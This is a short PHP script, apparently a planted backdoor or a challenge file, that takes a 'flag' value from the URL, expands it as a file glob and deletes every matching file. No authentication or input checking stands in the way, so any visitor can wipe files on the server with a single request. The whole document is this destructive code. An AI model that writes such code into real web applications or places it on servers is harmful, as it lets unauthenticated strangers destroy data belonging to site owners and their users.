<?php
if (isset($_GET['flag'])) {
    $dir = $_GET['flag'];
    array_map('unlink', glob($dir));
}
